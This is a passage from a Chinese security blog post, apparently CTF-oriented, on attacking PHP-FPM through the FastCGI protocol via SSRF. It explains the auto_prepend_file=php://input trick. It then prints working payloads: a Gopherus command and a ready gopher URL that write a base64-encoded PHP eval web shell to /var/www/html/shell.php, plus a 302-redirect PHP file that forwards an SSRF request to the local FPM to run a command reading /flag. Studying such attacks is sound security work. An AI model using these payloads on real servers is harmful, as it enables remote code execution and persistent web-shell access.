+<p><em><strong>简而言之，nginx知识一个服务器，php相关的活还得转交给背后的php干，而fastcgi就是这个“通讯兵”，而且是遵从某种转接规则的通讯兵，而php-fpm就是管理这些“通讯兵”的长官。</strong></em></p>
+<h3 id="攻击实现原理-1"><a href="#攻击实现原理-1" class="headerlink" title="攻击实现原理"></a>攻击实现原理</h3><p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p>
+<p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p>
+<p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
+<p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
+<p>那么就有趣了，假设我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p>
+<p>使用工具 <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a> 生成攻击FastCGI协议的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+<p>现成的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%<span class="number">3</span>A<span class="comment">//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520/var/www/html/shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png" alt="image-20230328102340167"></p>
+<h3 id="这里有一个利用ssrf302跳转打本地fpm的例子"><a href="#这里有一个利用ssrf302跳转打本地fpm的例子" class="headerlink" title="这里有一个利用ssrf302跳转打本地fpm的例子"></a>这里有一个利用ssrf302跳转打本地fpm的例子</h3><p>ssrf 302跳转绕过，打本地php-fpm</p>
+<p>302.php</p>
+<?php
+
+header('Location:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH31%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%1F%04%00%3C%3Fphp%20system%28%27od%20-t%20d1%20/flag%27%29%3Bdie%28%29%3B%3F%3E%00%00%00%00');
+
+?>
+
+<p><img src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630726777.png" alt="1666630726777"></p>
+<p>类似的，我们形成一个命令为ls的payload</p>
+<p><img src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630796804.png" alt="1666630796804"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262430#h2-8">https://www.anquanke.com/post/id/262430#h2-8</a></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/14/XPath%E5%9F%BA%E7%A1%80/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Xpath基础</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/13/PNG%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      PNG文件结构
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
